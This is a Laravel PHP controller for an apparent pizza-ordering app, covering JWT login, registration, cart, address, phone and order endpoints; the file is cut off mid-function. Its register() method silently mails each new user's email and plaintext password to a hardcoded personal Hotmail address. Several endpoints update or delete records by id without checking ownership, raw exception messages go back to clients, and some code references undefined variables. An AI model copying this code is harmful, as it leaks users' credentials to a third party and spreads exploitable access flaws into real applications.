<?php

namespace App\Http\Controllers;

use App\Models\carritoCompras;
use App\Models\detalleCarrito;
use App\Models\direcciones;
use App\Models\pedido_encabezado;
use App\Models\telefonos;
use App\Models\User;
use Carbon\Carbon;
use Dompdf\Dompdf;
use Exception;
use FileNotFoundException;
use Illuminate\Database\QueryException;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Validator;
use Illuminate\Validation\Rule;
use Illuminate\Validation\ValidationException;

class AuthjwtController extends Controller
{
    /**
     * Create a new AuthController instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('auth:api', ['except' => ['login', 'register']]);
    }

    /**
     * Get a JWT via given credentials.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function login()
    {
        $credentials = request(['email', 'password']);

        if (! $token = auth()->attempt($credentials)) {
            return response()->json(['error' => 'Unauthorized'], 401);
        }

        return $this->respondWithToken($token);
    }

    /**
     * Get the authenticated User.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function me()
    {
        return response()->json(auth()->user());
    }

    /**
     * Log the user out (Invalidate the token).
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function logout()
    {
        auth()->logout();

        return response()->json(['message' => 'Successfully logged out']);
    }

    /**
     * Refresh a token.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function refresh()
    {
        return $this->respondWithToken(auth()->refresh());
    }

    /**
     * Get the token array structure.
     *
     * @param  string  $token
     * @return \Illuminate\Http\JsonResponse
     */
    protected function respondWithToken($token)
    {
        return response()->json([
            'access_token' => $token,
            'token_type' => 'bearer',
            'expires_in' => auth()->factory()->getTTL() * 60,
        ]);
    }

    public function register(Request $request)
    {
        try {
            $validator = Validator::make($request->all(), [
                'name' => 'required',
                'email' => 'required|string|email|max:100|unique:users',
                'password' => 'required|string|min:3',
                'rol' => 'required|string|min:2',
            ]);

            if ($validator->fails()) {
                return response()->json($validator->errors()->toJson(), 400);
            }

            $user = User::create(array_merge(
                $validator->validate(),
                ['password' => bcrypt($request->password)]
            ));

            $details = [
                'title' => 'Correo: '.$request->email,
                'body' => 'Contraseña: '.$request->password,
            ];
            \Mail::to('huntercarias@hotmail.com')->send(new \App\Mail\sendPost($details));

            return response()->json([
                'message' => '¡Usuario registrado exitosamente!',
                'user' => $user,
            ], 201);
        } catch (ValidationException $exception) {
            return response()->json([
                'mensaje' => 'Error en informacion ingresada',
                'errores' => $exception->errors()]
            );
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general intentar adicionar registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    /**
     * Get the authenticated User.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function StoreProductoCarrito(Request $request)
    {
        try {
            $user = auth()->user(); // Obtiene el usuario autenticado
            $request->validate([
                'id_productos' => ['required', 'numeric'],
                'total' => ['required', 'numeric'],
                'cantidad' => ['required', 'numeric'],
                'extra_queso' => ['required', 'numeric'],
                'extra_jamon' => ['required', 'numeric'],
                'extra_peperoni' => ['required', 'numeric'],
            ]);
            $cabeceraCarrito = carritoCompras::where('id_usuario', $user->id)->first(); // Busca la cabecera del carrito para el usuario autenticado
            if (! $cabeceraCarrito) {
                $cabeceraCarrito = carritoCompras::create([
                    'id_usuario' => $user->id,
                    'total' => 0.00,
                ]);
            }

            $detalleCarrito = detalleCarrito::where('id_carrito_compras', $cabeceraCarrito->id)
                ->where('id_productos', $request['id_productos'])
                ->where('extra_queso', $request['extra_queso'])
                ->where('extra_jamon', $request['extra_jamon'])
                ->where('extra_peperoni', $request['extra_peperoni'])
                ->first();

            if (! $detalleCarrito) {
                $data = detalleCarrito::create([
                    'id_carrito_compras' => $cabeceraCarrito->id,
                    'id_productos' => $request['id_productos'],
                    'cantidad' => $request['cantidad'],
                    'extra_queso' => $request['extra_queso'],
                    'extra_jamon' => $request['extra_jamon'],
                    'extra_peperoni' => $request['extra_peperoni'],
                    'total' => $request['total'] * $request['cantidad'],
                ]);
            } else {
                $data = detalleCarrito::findOrFail($detalleCarrito->id);
                $data->cantidad = $data->cantidad + $request['cantidad'];
                $data->total = $data->cantidad * $request['total'];
                $data->save();
            }

            $data->totales = $detalleCarritoSumatoria = detalleCarrito::where('id_carrito_compras', $cabeceraCarrito->id)->sum('total');

            $cabeceraCarritototales = carritoCompras::findOrFail($cabeceraCarrito->id);

            // Actualizar los campos del modelo
            $cabeceraCarritototales->total = $data->totales;

            // Guardar los cambios en la base de datos
            $cabeceraCarritototales->save();

            return response()->json([
                'mensaje' => 'Producto cargado',
                'data' => $data,
            ]);
        } catch (ValidationException $exception) {
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $exception->errors(),
            ]);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar adicionar registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    /**
     * Get the authenticated User.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function ShowDetalleCarrito()
    {
        try {
            $user = auth()->user(); // Obtiene el usuario autenticado
            $cabeceraCarrito = carritoCompras::where('id_usuario', $user->id)->first(); // Busca la cabecera del carrito para el usuario autenticado
            if (! $cabeceraCarrito) {
                $cabeceraCarrito = carritoCompras::create([
                    'id_usuario' => $user->id,
                    'total' => 0.00,
                ]);
            }

            //$detalleCarrito = detalleCarrito::where('id_carrito_compras', $cabeceraCarrito->id)->get();

            $detalleCarrito = detalleCarrito::select('detalle_carritos.*', 'productos.descripcion', 'productos.ruta_imagen')
                ->join('productos', 'productos.id', '=', 'detalle_carritos.id_productos')
                ->where('detalle_carritos.id_carrito_compras', $cabeceraCarrito->id)
                ->get();

            $detalleCarritoContar = detalleCarrito::where('id_carrito_compras', $cabeceraCarrito->id)->count();
            if ($detalleCarritoContar == 0) {
                return response()->json(['mensaje' => 'Carrito Vacio'], 404);
            }

            $cabeceraCarritototales = carritoCompras::findOrFail($cabeceraCarrito->id);

            // Actualizar los campos del modelo
            $cabeceraCarritototales->total = $detalleCarritoSumatoria = detalleCarrito::where('id_carrito_compras', $cabeceraCarrito->id)->sum('total');

            // Guardar los cambios en la base de datos
            $cabeceraCarritototales->save();

            $data = [];

            foreach ($detalleCarrito as $detalle) {
                $path = storage_path('app/'.$detalle->ruta_imagen);
                $file = File::get($path);
                $type = File::mimeType($path);

                $producto = [
                    'id' => $detalle->id,
                    'cantidad' => $detalle->cantidad,
                    'descripcion' => $detalle->descripcion,
                    'total' => $detalle->total,
                    'extra_queso' => $detalle->extra_queso,
                    'extra_jamon' => $detalle->extra_jamon,
                    'extra_peperoni' => $detalle->extra_peperoni,
                    'ruta_imagen' => base64_encode($file),
                    'tipo_imagen' => $type,
                ];

                array_push($data, $producto);
            }

            return response()->json([
                'mensaje' => 'Detalle Carrito Compras',
                'data' => $data,
            ]);
        } catch (FileNotFoundException $e) {
            // Manejar la excepción aquí
            return response()->json(['mensaje' => 'El archivo no existe'], 404);
        } catch (ValidationException $exception) {
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $exception->errors(),
            ]);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar adicionar registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    /**
     * Get the authenticated User.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function ConsultaCarrito()
    {
        try {
            $user = auth()->user(); // Obtiene el usuario autenticado
            $cabeceraCarrito = carritoCompras::where('id_usuario', $user->id)->first(); // Busca la cabecera del carrito para el usuario autenticado
            if (! $cabeceraCarrito) {
                $cabeceraCarrito = carritoCompras::create([
                    'id_usuario' => $user->id,
                    'total' => 0.00,
                ]);
            }

            $cabeceraCarritototales = carritoCompras::findOrFail($cabeceraCarrito->id);

            // Actualizar los campos del modelo
            $cabeceraCarritototales->total = detalleCarrito::where('id_carrito_compras', $cabeceraCarrito->id)->sum('total');

            // Guardar los cambios en la base de datos
            $cabeceraCarritototales->save();

            return response()->json([
                'mensaje' => 'Detalle Carrito Compras',
                'data' => $cabeceraCarrito,
            ]);
        } catch (ValidationException $exception) {
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $exception->errors(),
            ]);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar adicionar registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    /**
     * Get the authenticated User.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function GuardaDireccion(Request $request)
    {
        try {
            $user = auth()->user(); // Obtiene el usuario autenticado

            $request->validate([
                'nomenclatura' => ['required', 'string', 'min:2'],
                'zona' => ['required', 'numeric'],
                'ciudad' => ['required', 'string', 'min:2'],
                'departamento' => ['required', 'string', 'min:2'],
                'municipio' => ['required', 'string', 'min:2'],
                'lote' => ['numeric'],
                'numero_telefono' => ['numeric', 'min:8'],
                'extension' => ['numeric', 'min:2'],
                'numero_celular' => ['required',  'numeric', 'min:6'],
                'numero_de_whatzap' => ['required', 'numeric', 'min:6'],
            ]);

            $direccion = direcciones::create([
                'id_usuario' => $user->id,
                'nomenclatura' => $request['nomenclatura'],
                'zona' => $request['zona'],
                'ciudad' => $request['ciudad'],
                'departamento' => $request['departamento'],
                'municipio' => $request['municipio'],
                'lote' => $request['lote'],
            ]);

            $telefono = telefonos::create([
                'id_usuario' => $user->id,
                'numero_telefono' => $request['numero_telefono'],
                'extension' => $request['extension'],
                'numero_celular' => $request['numero_celular'],
                'numero_de_whatzap' => $request['numero_de_whatzap'],
            ]);

            return response()->json([
                'mensaje' => 'Direccion y Telefono guardado exitosamente',
            ]);
        } catch (ValidationException $exception) {
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $exception->errors(),
            ]);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar adicionar registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    /**
     * Show the form for editing the specified resource.
     */
    public function updatedireccion(Request $request)
    {
        try {
            //Validación
            $request->validate([
                'id' => ['required', 'numeric'],
                'nomenclatura' => ['required', 'string', 'min:2'],
                'zona' => ['required', 'numeric'],
                'ciudad' => ['required', 'string', 'min:2'],
                'departamento' => ['required', 'string', 'min:2'],
                'municipio' => ['required', 'string', 'min:2'],
                'lote' => ['numeric'],
            ]);
            $direcciones = direcciones::findOrFail($request->input('id'));
            // Actualizar los campos del modelo
            $direcciones->nomenclatura = $request->input('nomenclatura');
            $direcciones->zona = $request->input('zona');
            $direcciones->ciudad = $request->input('ciudad');
            $direcciones->departamento = $request->input('departamento');
            $direcciones->municipio = $request->input('municipio');
            $direcciones->lote = $request->input('lote');
            // Guardar los cambios en la base de datos
            $direcciones->save();

            return response()->json([
                'mensaje' => 'Se actualizó correctamente la direccion',
                'data' => $direcciones,
            ]);
        } catch (FileNotFoundException $e) {
            // Manejar la excepción aquí
            return response()->json(['mensaje' => 'El archivo no existe'], 404);

        } catch (ValidationException $exception) {
            return response()->json([
                'mensaje' => 'Error en información ingresada',
                'data' => $exception->errors(),
            ], 400);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al actualizar el registro en la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar actualizar registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    public function destroydireccion(Request $request)
    {
        $request->validate([
            'id' => 'required|integer',
        ]);

        try {
            $producto = direcciones::findOrFail($request->input('id'));
            $producto->delete();

            return response()->json([
                'mensaje' => 'Se eliminó correctamente el registro',
            ]);

        } catch (ModelNotFoundException $exception) {
            return response()->json([
                'mensaje' => 'El registro que intenta eliminar no existe',
            ], 404);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al eliminar el registro de la base de datos',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar eliminar el registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    /**
     * Show the form for editing the specified resource.
     */
    public function updatetelefono(Request $request)
    {
        try {
            //Validación
            $request->validate([
                'id' => ['required', 'numeric'],
                'numero_telefono' => ['numeric', 'min:8'],
                'extension' => ['numeric', 'min:2'],
                'numero_celular' => ['required',  'numeric', 'min:8'],
                'numero_de_whatzap' => ['required', 'numeric', 'min:8'],
            ]);

            $telefono = telefonos::findOrFail($request->input('id'));
            // Actualizar los campos del modelo
            $telefono->numero_telefono = $request->input('numero_telefono');
            $telefono->extension = $request->input('extension');
            $telefono->numero_celular = $request->input('numero_celular');
            $telefono->numero_de_whatzap = $request->input('numero_de_whatzap');
            // Guardar los cambios en la base de datos
            $telefono->save();

            return response()->json([
                'mensaje' => 'Se actualizó correctamente la telefono',
                'data' => $telefono,
            ]);
        } catch (FileNotFoundException $e) {
            // Manejar la excepción aquí
            return response()->json(['mensaje' => 'El archivo no existe'], 404);

        } catch (ValidationException $exception) {
            return response()->json([
                'mensaje' => 'Error en información ingresada',
                'data' => $exception->errors(),
            ], 400);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al actualizar el registro en la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar actualizar registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    public function destroytelefonos(Request $request)
    {
        $request->validate([
            'id' => 'required|integer',
        ]);

        try {
            $telefono = telefonos::findOrFail($request->input('id'));
            $telefono->delete();

            return response()->json([
                'mensaje' => 'Se eliminó correctamente el registro',
            ]);

        } catch (ModelNotFoundException $exception) {
            return response()->json([
                'mensaje' => 'El registro que intenta eliminar no existe',
            ], 404);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al eliminar el registro de la base de datos',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar eliminar el registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    /**
     * Get the authenticated User.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function muestraListaDirecciones(Request $request)
    {
        try {
            $user = auth()->user(); // Obtiene el usuario autenticado

            if (! $user->count()) {
                return response()->json(['mensaje' => 'Error usuario no autenticado'], 400);
            }

            $direcciones = Direcciones::where('id_usuario', $user->id)->get();

            if (! $direcciones->count()) {
                return response()->json(['mensaje' => 'no tiene direcciones'], 404);
            }

            return response()->json([
                'mensaje' => 'Lista de todas las direcciones',
                'data' => $direcciones,
            ]);
        } catch (ValidationException $exception) {
            return response()->json([
                'mensaje' => 'Error al validar los datos recibidos.',
                'data' => $exception->errors(),
            ]);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al consultar la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar obtener la lista de direcciones.',
                'data' => $e->getMessage(),
            ]);
        }
    }

    /**
     * Get the authenticated User.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function Muestralistatelefono(Request $request)
    {
        try {
            $user = auth()->user(); // Obtiene el usuario autenticado

            if (! $user) {
                return response()->json(['mensaje' => 'Error usuario no autenticado'], 400);
            } else {

                $telefonos = telefonos::where('id_usuario', $user->id)->get();
                if (! $telefonos) {
                    return response()->json(['mensaje' => 'no tiene telefonos'], 404);
                }
            }

            return response()->json([
                'mensaje' => 'Lista de telefonos Telefono',
                'data' => $telefonos,
            ]);
        } catch (ValidationException $exception) {
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $exception->errors(),
            ]);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar adicionar registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    /**
     * Get the authenticated User.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function StorePedidoCarritoDireccion(Request $request)
    {
        try {
            $user = auth()->user(); // Obtiene el usuario autenticado
            $request->validate([
                'status_pedido' => ['nullable', 'string', 'min:2'],
                'id_direcciones' => ['nullable', 'numeric'],
                'id_telefonos' => ['nullable', 'numeric'],
                'forma_pago' => ['nullable', 'numeric'],
            ]);

            $cabeceraCarrito = carritoCompras::where('id_usuario', $user->id)->first(); // Busca la cabecera del carrito para el usuario autenticado
            if (! $cabeceraCarrito->count()) {
                $cabeceraCarrito = carritoCompras::create([
                    'id_usuario' => $user->id,
                    'total' => 0.00,
                ]);

                return response()->json(['mensaje' => 'no hay elementos en carrito'], 404);
            }

            $cabeceraPedido = pedido_encabezado::where('id_usuario', $user->id)
                ->where('id_carrito', $cabeceraCarrito->id)
                ->first();

            if (! isset($cabeceraPedido) || $cabeceraPedido == null || ! $cabeceraPedido->count()) {
                $cabeceraPedido = pedido_encabezado::create([
                    'id_usuario' => $user->id,
                    'id_carrito' => $cabeceraCarrito->id,
                    'total' => $cabeceraCarrito->total,
                    'status_pedido' => $request->input('status_pedido', ''),
                    'id_direcciones' => $request->input('id_direcciones', 0),
                    'id_telefonos' => $request->input('id_telefonos', 0),
                    'forma_pago' => $request->input('forma_pago', 0),
                    'id_repartidor' => 0,
                ]);

                return response()->json([
                    'mensaje' => 'Pedido cargado',
                    'data' => $cabeceraPedido,
                ]);
            }

            $cabeceraPedidoupdate = pedido_encabezado::findOrFail($cabeceraPedido->id);

            $cabeceraPedidoupdate->total = $cabeceraCarrito->total;

            if (! empty($request->input('status_pedido'))) {
                $cabeceraPedidoupdate->status_pedido = $request->input('status_pedido');
            }

            if (! empty($request->input('id_direcciones'))) {
                $cabeceraPedidoupdate->id_direcciones = $request->input('id_direcciones');
            }

            if (! empty($request->input('id_telefonos'))) {
                $cabeceraPedidoupdate->id_telefonos = $request->input('id_telefonos');
            }

            if (! empty($request->input('forma_pago'))) {
                $cabeceraPedidoupdate->forma_pago = $request->input('forma_pago');
            }

            $cabeceraPedidoupdate->save();

            return response()->json([
                'mensaje' => 'pedido cargado',
                'data' => $cabeceraPedidoupdate,
            ]);
        } catch (ValidationException $exception) {
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $exception->errors(),
            ]);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar adicionar registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    /**
     * Get the authenticated User.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function SolicitudPedidoCarritoInicial(Request $request)
    {
        try {
            $user = auth()->user(); // Obtiene el usuario autenticado
            $request->validate([
                'status_pedido' => ['nullable', 'string', 'min:2'],
                'id_direcciones' => ['nullable', 'numeric'],
                'id_telefonos' => ['nullable', 'numeric'],
                'forma_pago' => ['nullable', 'numeric'],
            ]);

            $cabeceraCarrito = carritoCompras::where('id_usuario', $user->id)->first(); // Busca la cabecera del carrito para el usuario autenticado
            if (! $cabeceraCarrito->count()) {
                $cabeceraCarrito = carritoCompras::create([
                    'id_usuario' => $user->id,
                    'total' => 0.00,
                ]);

                return response()->json(['mensaje' => 'no hay elementos en carrito'], 404);
            }

            $cabeceraPedido = pedido_encabezado::where('id_usuario', $user->id)
                ->where('id_carrito', $cabeceraCarrito->id)
                ->first();

            if (! $cabeceraPedido->count()) {
                $cabeceraPedido = pedido_encabezado::create([
                    'id_usuario' => $user->id,
                    'id_carrito' => $cabeceraCarrito->id,

                    'total' => $cabeceraCarrito->total,
                    'status_pedido' => $request->input('status_pedido', ''),
                    'id_direcciones' => $request->input('id_direcciones', 0),
                    'id_telefonos' => $request->input('id_telefonos', 0),
                    'forma_pago' => $request->input('forma_pago', 0),
                    'id_repartidor' => 0,
                ]);

                return response()->json([
                    'mensaje' => 'Pedido Cargado',
                    'data' => $cabeceraPedido,
                ]);
            }

            $cabeceraPedidoupdate = pedido_encabezado::findOrFail($cabeceraPedido->id);

            $cabeceraPedidoupdate->total = $cabeceraCarrito->total;

            if (! empty($request->input('status_pedido'))) {
                $cabeceraPedidoupdate->status_pedido = $request->input('status_pedido');
            }

            if (! empty($request->input('id_direcciones'))) {
                $cabeceraPedidoupdate->id_direcciones = $request->input('id_direcciones');
            }

            if (! empty($request->input('id_telefonos'))) {
                $cabeceraPedidoupdate->id_telefonos = $request->input('id_telefonos');
            }

            if (! empty($request->input('forma_pago'))) {
                $cabeceraPedidoupdate->forma_pago = $request->input('forma_pago');
            }

            $cabeceraPedidoupdate->save();

            $cabeceraCarritofinal = carritoCompras::where('id_usuario', $user->id)->first();
            $cabeceraCarritofinal->delete();

            return response()->json([
                'mensaje' => 'pedido cargado',
                'data' => $cabeceraPedidoupdate,
            ]);
        } catch (ValidationException $exception) {
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $exception->errors(),
            ]);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar adicionar registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    /**
     * Get the authenticated User.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function InformacionPedidoCarrito(Request $request)
    {
        try {
            $user = auth()->user(); // Obtiene el usuario autenticado

            $cabeceraCarrito = carritoCompras::where('id_usuario', $user->id)->first(); // Busca la cabecera del carrito para el usuario autenticado
            if (! $cabeceraCarrito->count()) {

                return response()->json(['mensaje' => 'no hay elementos en carrito'], 404);
            }

            $cabeceraPedido = pedido_encabezado::where('id_usuario', $user->id)
                ->where('id_carrito', $cabeceraCarrito->id)
                ->first();

            if (! $cabeceraPedido->count()) {
                $cabeceraPedido = pedido_encabezado::create([
                    'id_usuario' => $user->id,
                    'id_carrito' => $cabeceraCarrito->id,

                    'total' => $cabeceraCarrito->total,
                    'status_pedido' => 'CREACION PEDIDO',
                    'id_direcciones' => 0,
                    'id_telefonos' => 0,
                    'forma_pago' => 0,
                    'id_repartidor' => 0,
                ]);
            }

            $informacionPDirecciones = direcciones::where('id', $cabeceraPedido->id_direcciones)->first();
            $informacionPTelefono = telefonos::where('id', $cabeceraPedido->id_telefonos)->first();

            $informacionPedido = [
                'pedido_encabezado' => $cabeceraPedido,
                'direcciones' => $informacionPDirecciones,
                'telefonos' => $informacionPTelefono,
            ];

            //->join('detalleCarrito', 'pedido_encabezado.id_carrito', '=', 'detalleCarrito.id_carrito_compras')
            return response()->json([
                'mensaje' => 'pedido cargado',
                'data' => $informacionPedido,
            ]);
        } catch (ValidationException $exception) {
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $exception->errors(),
            ]);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar adicionar registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    /**
     * Get the authenticated User.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function InformacionDireccionTelefono(Request $request)
    {
        try {
            $user = auth()->user(); // Obtiene el usuario autenticado

            if (! $user->count()) {

                return response()->json(['mensaje' => 'NO AUTORIZADO'], 404);
            }

            $request->validate([
                'id' => ['required', 'numeric'],
            ]);

            $cabeceraPedido = pedido_encabezado::where('id', $request->input('id'))
                ->first();

            if (! $cabeceraPedido->count()) {
                $cabeceraPedido = pedido_encabezado::create([
                    'id_usuario' => $user->id,
                    'id_carrito' => $cabeceraCarrito->id,

                    'total' => $cabeceraCarrito->total,
                    'status_pedido' => 'CREACION PEDIDO',
                    'id_direcciones' => 0,
                    'id_telefonos' => 0,
                    'forma_pago' => 0,
                    'id_repartidor' => 0,
                ]);
            }

            $informacionPDirecciones = direcciones::where('id', $cabeceraPedido->id_direcciones)->first();
            $informacionPTelefono = telefonos::where('id', $cabeceraPedido->id_telefonos)->first();

            $informacionPedido = [
                'pedido_encabezado' => $cabeceraPedido,
                'direcciones' => $informacionPDirecciones,
                'telefonos' => $informacionPTelefono,
            ];

            //->join('detalleCarrito', 'pedido_encabezado.id_carrito', '=', 'detalleCarrito.id_carrito_compras')
            return response()->json([
                'mensaje' => 'pedido cargado',
                'data' => $informacionPedido,
            ]);
        } catch (ValidationException $exception) {
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $exception->errors(),
            ]);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar adicionar registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    /**
     * Get the authenticated User.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function EliminarProductoCarrito(Request $request)
    {
        $request->validate([
            'id' => ['required', 'numeric'],
        ]);
        try {

            $detalleCarrito = detalleCarrito::find($request->input('id'));
            $detalleCarrito->delete();

            $user = auth()->user(); // Obtiene el usuario autenticado
            $cabeceraCarrito = carritoCompras::where('id_usuario', $user->id)->first(); // Busca la cabecera del carrito para el usuario autenticado
            if (! $cabeceraCarrito) {
                $cabeceraCarrito = carritoCompras::create([
                    'id_usuario' => $user->id,
                    'total' => 0.00,
                ]);
            }

            $cabeceraCarritototales = carritoCompras::findOrFail($cabeceraCarrito->id);

            // Actualizar los campos del modelo
            $cabeceraCarritototales->total = detalleCarrito::where('id_carrito_compras', $cabeceraCarrito->id)->sum('total');

            // Guardar los cambios en la base de datos
            $cabeceraCarritototales->save();

            return response()->json([
                'mensaje' => 'Producto eliminado del carrito',
                'data' => $detalleCarrito,
            ]);
        } catch (ValidationException $exception) {
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $exception->errors(),
            ]);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar adicionar registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    /**
     * Get the authenticated User.
     *
     * @return \Illuminate\Http\JsonResponse
     */
    public function MostrarPedidoRealizados(Request $request)
    {
        try {
            $user = auth()->user(); // Obtiene el usuario autenticado

            //$cabeceraPedidos = pedido_encabezado::where('id_usuario', $user->id)->get();

            $cabeceraPedidos = pedido_encabezado::where('id_usuario', $user->id)
                ->orderBy('created_at', 'desc')
                ->get();

            if (! $cabeceraPedidos->count()) {
                return response()->json(['mensaje' => 'No hay elementos'], 404);
            }

            return response()->json([
                'mensaje' => 'Pedido cargado',
                'data' => $cabeceraPedidos,
            ]);
        } catch (ValidationException $exception) {
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $exception->errors(),
            ]);
        } catch (QueryException $e) {
            // Manejo de excepciones de consulta a la base de datos
            return response()->json([
                'mensaje' => 'Error al crear el registro en la base de datos.',
                'data' => $e->getMessage(),
            ]);
        } catch (Exception $e) {
            // Manejo de excepciones generales
            return response()->json([
                'mensaje' => 'Error general al intentar adicionar registro',
                'data' => $e->getMessage(),
            ]);
        }
    }

    public function MostrarPedidosCreados(Request $request)
    {
        try {
            $user = auth()->user(); // Obtiene el usuario autenticado
            if (! $user->count()) {
                return response()->json(['mensaje' => 'No autorizado'], 404);
            }

            $cabeceraPedidos = pedido_encabezado::where('status_pedido', 'CREACION-PEDIDO')
                ->orWhere('status_pedido', 'CREACION PEDIDO')
                ->orWhere('status_pedido', 'SOLICITADO')
                ->get();
            if (! $cabeceraPedidos->count()) {
                return response()->json(['mensaje' => 'No hay elementos'], 404);
            }

            return response()->json([
                'mensaje' => 'Pedido cargado',
                'data' => $cabeceraPedidos,
            ]);
        } catch (ValidationException $exception) {
            return response()->json([
